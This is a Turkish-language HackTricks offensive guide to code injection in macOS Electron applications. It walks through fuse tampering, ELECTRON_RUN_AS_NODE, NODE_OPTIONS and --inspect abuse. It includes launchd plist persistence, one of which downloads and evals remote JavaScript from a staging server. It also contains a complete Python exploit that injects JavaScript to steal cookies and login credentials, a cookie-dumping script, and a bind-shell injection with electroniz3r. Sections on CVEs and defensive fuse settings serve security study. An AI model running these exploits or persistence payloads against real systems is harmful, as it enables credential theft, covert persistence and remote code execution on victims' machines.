# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Electron'ın ne olduğunu bilmiyorsanız [**burada çok sayıda bilgi bulabilirsiniz**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Ancak şimdilik Electron'ın **node** çalıştırdığını bilmeniz yeterlidir.\
Ve node'un, belirtilen dosyanın dışında **başka kodları çalıştırmasını sağlamak** için kullanılabilecek bazı **parametreleri** ve **env değişkenleri** vardır.

### Electron Fuses

Bu teknikler ileride ele alınacaktır; ancak son zamanlarda Electron bunları **önlemek için çeşitli güvenlik flag'leri ekledi**. Bunlar [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) olarak adlandırılır ve macOS'ta Electron uygulamalarının **arbitrary code yüklemesini önlemek** için kullanılanlar şunlardır:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Devre dışı bırakılırsa, kod enjekte etmek için **`ELECTRON_RUN_AS_NODE`** env var'ının kullanılmasını önler.
- **`EnableNodeCliInspectArguments`**: Devre dışı bırakılırsa, `--inspect`, `--inspect-brk` gibi parametreler dikkate alınmaz. Böylece kod enjekte etme yöntemi engellenir.
- **`EnableEmbeddedAsarIntegrityValidation`**: Etkinleştirilirse, yüklenen **`asar`** **file**, macOS tarafından **doğrulanır**. Böylece bu file'ın içeriğini değiştirerek gerçekleştirilecek **code injection** önlenir.
- **`OnlyLoadAppFromAsar`**: Bu etkinleştirilirse, yükleme araması şu sırayla yapılmaz: **`app.asar`**, **`app`** ve son olarak **`default_app.asar`**. Yalnızca app.asar kontrol edilir ve kullanılır; böylece **`embeddedAsarIntegrityValidation`** fuse'u ile **birlikte kullanıldığında**, **doğrulanmamış code yüklemek** imkansız hale gelir.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Etkinleştirilirse, browser process V8 snapshot'ı için `browser_v8_context_snapshot.bin` adlı file'ı kullanır.

Code injection'ı önlemeyen bir başka ilginç fuse şudur:

- **EnableCookieEncryption**: Etkinleştirilirse, disk üzerindeki cookie store, OS level cryptography keys kullanılarak şifrelenir.

### Electron Fuses'ları Kontrol Etme

Bu flag'leri bir application'dan şu şekilde **kontrol edebilirsiniz**:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuses Değiştirme

[**Belgelerde belirtildiği gibi**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron Fuses** yapılandırması, içinde bir yerde **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** dizesini içeren **Electron binary** dosyasının içinde yapılandırılır.<sup>[[1]](#references)</sup>

macOS uygulamalarında bu dosya genellikle `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` konumundadır.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Bu dosyayı [https://hexed.it/](https://hexed.it/) içinde açabilir ve önceki string'i arayabilirsiniz. Bu string'den sonra ASCII biçiminde, her fuse'un devre dışı mı yoksa etkin mi olduğunu gösteren bir "0" veya "1" görebilirsiniz. **Fuse değerlerini değiştirmek** için hex kodunu (`0x30`, `0` ve `0x31`, `1` değeridir) değiştirmeniz yeterlidir.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Değiştirilmiş bu byte'lara sahip **`Electron Framework` binary** dosyasını bir uygulamanın içinde **overwrite** etmeye çalışırsanız uygulamanın çalışmayacağını unutmayın.

## Electron Applications'a code ekleyerek RCE

Bir Electron App'in kullandığı **external JS/HTML files** olabilir. Bu nedenle bir attacker, signature'ı kontrol edilmeyen bu dosyalara code inject edebilir ve app context'inde arbitrary code execute edebilir.

> [!CAUTION]
> Ancak şu anda 2 limitation bulunmaktadır:
>
> - Bir App'i modify etmek için **`kTCCServiceSystemPolicyAppBundles`** permission'ı **gereklidir**; bu nedenle varsayılan olarak artık mümkün değildir.
> - Compiled **`asap`** file'ında genellikle **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** fuses'ları **enabled** durumdadır.
>
> Bu durum attack path'i daha complicated (veya impossible) hale getirir.

**`kTCCServiceSystemPolicyAppBundles`** gereksinimini, application'ı başka bir directory'ye (örneğin **`/tmp`**) copy'leyerek, **`app.app/Contents`** folder'ını **`app.app/NotCon`** olarak rename'leyerek, **asar** file'ını **malicious** code'unuzla **modify** ederek, tekrar **`app.app/Contents`** olarak rename'leyerek ve execute ederek bypass etmenin mümkün olduğunu unutmayın.

asar file'ındaki code'u şu komutla unpack edebilirsiniz:
```bash
npx asar extract app.asar app-decomp
```
Ve değiştirdikten sonra tekrar paketleyin:
```bash
npx asar pack app-decomp app-new.asar
```
## ELECTRON_RUN_AS_NODE ile RCE

[**docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)'a göre bu env variable ayarlanırsa process normal bir Node.js process'i olarak başlatılır.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> **`RunAsNode`** fuse'u devre dışı bırakılırsa **`ELECTRON_RUN_AS_NODE`** env var'ı yok sayılır ve bu çalışmaz.

### App Plist'ten Injection

[**Burada önerildiği gibi**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), persistence'ı sürdürmek için bu env variable'ı bir plist içinde abuse edebilirsiniz:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS` ile RCE

Payload'ı farklı bir dosyada saklayabilir ve çalıştırabilirsiniz:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> **`EnableNodeOptionsEnvironmentVariable`** fuse'u **devre dışı** bırakılmışsa uygulama, **`ELECTRON_RUN_AS_NODE`** env variable'ı ayarlanmadığı sürece başlatıldığında **NODE_OPTIONS** env variable'ını **yok sayar**; fuse **`RunAsNode`** devre dışı bırakılmışsa bu env variable da **yok sayılır**.
>
> **`ELECTRON_RUN_AS_NODE`** ayarlanmazsa şu **error** ile karşılaşırsınız: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### App Plist üzerinden Injection

Bu env variable'ı bir plist içinde abuse ederek aşağıdaki key'leri ekleyip persistence sağlayabilirsiniz:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## inspect ile RCE

[**Bu**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) kaynağa göre, bir Electron uygulamasını **`--inspect`**, **`--inspect-brk`** ve **`--remote-debugging-port`** gibi flag'lerle çalıştırırsanız, **bir debug portu açılır**; böylece bu porta bağlanabilir (örneğin Chrome'da `chrome://inspect` üzerinden) ve **üzerine code inject edebilir** veya hatta yeni process'ler başlatabilirsiniz.<sup>[[7]](#references)</sup>\
Örneğin:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**bu blogpostta**](https://hackerone.com/reports/1274695), bu debugging, headless chrome'un **herhangi bir konuma rastgele dosyalar indirmesini** sağlamak için kötüye kullanılıyor.<sup>[[8]](#references)</sup>

> [!TIP]
> Bir uygulamanın env değişkenlerinin veya `--inspect` gibi parametrelerin ayarlanıp ayarlanmadığını kontrol etmek için kendine özgü bir yöntemi varsa, uygulamanın başlangıcında **çalışmayı durduracak** ve bir bypass gerçekleştirecek `--inspect-brk` argümanını kullanarak bunu runtime'da **bypass etmeyi** deneyebilirsiniz (örneğin mevcut process'in argümanlarını veya env değişkenlerini üzerine yazarak).

Aşağıdaki exploit'te, uygulamayı `--inspect-brk` parametresiyle izleyip çalıştırarak sahip olduğu özel korumayı bypass etmek (process'in parametrelerinin üzerine yazarak `--inspect-brk` parametresini kaldırmak) ve ardından uygulamadaki cookie'leri ve kimlik bilgilerini dump etmek için bir JS payload enjekte etmek mümkün oluyordu:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> **`EnableNodeCliInspectArguments`** fuse'ı devre dışı bırakılırsa uygulama, **`ELECTRON_RUN_AS_NODE`** ortam değişkeni ayarlanmadığı sürece başlatıldığında **node parametrelerini** (örneğin **`--inspect`**) yok sayar; fuse **`RunAsNode`** devre dışı bırakılmışsa bu ortam değişkeni de yok sayılır.
>
> Ancak yine de **electron parametresi `--remote-debugging-port=9229`** kullanılabilir, fakat önceki payload diğer process'leri çalıştırmak için işe yaramaz.

**`--remote-debugging-port=9222`** parametresi kullanılarak Electron App'ten **history** (GET komutlarıyla) veya browser'ın **cookies**'leri gibi bazı bilgiler çalınabilir (bunlar browser içinde **decrypted** durumdadır ve bunları sağlayan bir **json endpoint** bulunur).

Bunu nasıl yapacağınızı [**burada**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [**burada**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) öğrenebilir ve otomatik araç olan [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) veya aşağıdaki gibi basit bir script kullanabilirsiniz:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### App Plist'inden Injection

Persistence sağlamak için bir plist içindeki bu env variable'ı kötüye kullanarak şu key'leri ekleyebilirsiniz:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Daha Eski Sürümleri Kötüye Kullanarak TCC Bypass

> [!TIP]
> macOS'taki TCC daemon'u uygulamanın çalıştırılan sürümünü kontrol etmez. Bu nedenle, önceki tekniklerden herhangi biriyle **bir Electron application içine code inject edemiyorsanız**, APP'nin önceki bir sürümünü indirip bu sürüme code inject edebilirsiniz; çünkü bu sürüm yine TCC privileges alır (Trust Cache bunu engellemediği sürece).

## JS Olmayan Code Çalıştırma

Önceki teknikler, **Electron application process'i içinde JS code çalıştırmanıza** olanak tanır. Ancak **child process'lerin parent application ile aynı sandbox profile altında çalıştığını** ve **TCC permissions'larını devraldığını** unutmayın.\
Bu nedenle, örneğin camera veya microphone'a erişmek için entitlements'ı kötüye kullanmak istiyorsanız, **process içinden başka bir binary çalıştırmanız** yeterlidir.

## Dikkate Değer Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 ve çeşitli 23-27 pre-release sürümleri, `.app/Contents/Resources` folder'ına write access'i olan bir saldırganın `embeddedAsarIntegrityValidation` **ve** `onlyLoadAppFromAsar` fuses'larını bypass etmesine izin veriyordu. Bug, integrity checker içindeki bir *file-type confusion* problemiydi ve hazırlanmış **`app.asar` adlı bir directory'nin** doğrulanmış archive yerine yüklenmesine olanak tanıyordu; bu nedenle bu directory içine yerleştirilen herhangi bir JavaScript, application başlatıldığında çalıştırılıyordu. Hardening guidance'ı izleyip her iki fuse'u etkinleştiren vendor'lar bile macOS'ta hâlâ vulnerable durumdaydı.<sup>[[3]](#references)</sup>

Patch uygulanmış Electron sürümleri: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** ve **27.0.0-alpha.7**. Daha eski bir build çalıştıran saldırganlar, application'ın TCC entitlements'larıyla code çalıştırmak için `Contents/Resources/app.asar` dosyasını kendi directory'leriyle değiştirebilir.<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster'ı

Ocak 2024'te bir dizi CVE (CVE-2024-23738 ile CVE-2024-23743 arası), birçok Electron application'ın **RunAsNode** ve **EnableNodeCliInspectArguments** fuses'larını hâlâ etkin şekilde sunduğunu ortaya çıkardı. Bu nedenle local bir saldırgan, programı `ELECTRON_RUN_AS_NODE=1` environment variable'ı veya `--inspect-brk` gibi flag'lerle yeniden başlatarak programı *generic* bir Node.js process'ine dönüştürebilir ve application'ın sandbox ve TCC permissions'larının tamamını devralabilir.<sup>[[4]](#references)</sup>

Electron team “critical” rating'ine itiraz etmiş ve saldırganın zaten local code execution'a ihtiyaç duyduğunu belirtmiş olsa da bu issue post-exploitation sırasında hâlâ değerlidir; çünkü vulnerable durumdaki herhangi bir Electron bundle'ını, desktop app'e daha önce verilen Contacts, Photos veya diğer sensitive resources'ları örneğin okuyabilen bir *living-off-the-land* binary'sine dönüştürür.<sup>[[4]](#references)</sup>

Electron maintainers tarafından sağlanan defensive guidance:<sup>[[4]](#references)</sup>

* Production build'lerinde `RunAsNode` ve `EnableNodeCliInspectArguments` fuses'larını disable edin.
* Application'ınızın gerçekten helper Node.js process'ine ihtiyacı varsa, bu fuses'ları yeniden etkinleştirmek yerine daha yeni **UtilityProcess** API'sini kullanın.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) tool'u, kurulu **vulnerable electron applications'ları bulmak** ve bunlara code inject etmek için kolayca kullanılabilir. Bu tool, **`--inspect`** tekniğini kullanmayı dener:

Tool'u kendiniz compile etmeniz gerekir ve şu şekilde kullanabilirsiniz:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki, uygulamaların JavaScript dosyalarını Loki Command & Control JavaScript dosyalarıyla değiştirerek Electron uygulamalarına backdoor yerleştirmek için tasarlanmıştır.


## Referanslar

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [MacOS Injection via Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ASAR Integrity bypass via filetype confusion (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Statement regarding 'runAsNode' CVEs - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - A New Weapon in Your Red Teaming Armory - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Why Electron apps can't store your secrets confidentially: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging abused to download arbitrary files](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Dumping Cookies with Chromium's Remote Debugger Port - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debugging Cookie Dumping Failures with Chromium's Remote Debugger - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
